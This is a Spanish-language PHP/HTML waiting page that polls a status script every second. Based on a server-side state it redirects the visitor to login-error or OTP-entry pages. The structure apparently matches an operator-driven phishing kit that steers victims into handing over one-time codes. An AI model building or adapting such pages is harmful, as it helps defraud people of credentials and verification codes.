<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Esperando Confirmación</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f3f4f6;
        }
        .container {
            text-align: center;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #ccc;
            border-top-color: #edff00;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        .logoes{
            width: 184px;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        h1 {
            font-size: 1.5rem;
            color: #333;
        }
        p {
            color: #555;
        }
    </style>
</head>
<body>
    <?php
    // Incluir el archivo de conexión a la base de datos
    include '../../../../assets/config/conexion.php';
    ?>

    <div class="container">
        <img src="img/Logo.svg" class="logoes">
        <h1>Estamos procesando tu solicitud...</h1>
        <div class="spinner"></div>
        <p>Esto puede tardar unos momentos.</p>
    </div>

    <script>
        // Obtener el ID del cliente desde la URL
        const params = new URLSearchParams(window.location.search);
        const clienteId = params.get("id");

        if (!clienteId) {
            // Redirigir automáticamente al inicio si no hay un ID válido
            window.location.href = "index.php";
        }

        // Verificar el estado del cliente cada 1 segundo
        const checkStatus = async () => {
            try {
                const response = await fetch(`funtions/verificar-estado.php?id=${clienteId}`);
                const result = await response.json();

                if (response.ok) {
                    // Se elimina el &estado=0 de las URLs de redirección
                    switch (result.estado) {
                        case 1:
                            window.location.href = `error-login.php?id=${clienteId}`;
                            break;
                        case 2:
                            window.location.href = `otp.php?id=${clienteId}`;
                            break;
                        case 3:
                            window.location.href = `otp-error.php?id=${clienteId}`;
                            break;
                        case 4:
                            window.location.href = `otp-.php?id=${clienteId}`;
                            break;
                        default:
                            console.error("Estado desconocido o no válido.");
                            // Si el estado no coincide con un caso, no redirigir
                    }
                } else {
                    console.error(result.error || "Error al verificar el estado.");
                }
            } catch (error) {
                console.error("Error en la solicitud:", error);
            }
        }; 

        // Ejecutar la función cada 1 segundo
        setInterval(checkStatus, 1000);
    </script>
</body>
</html>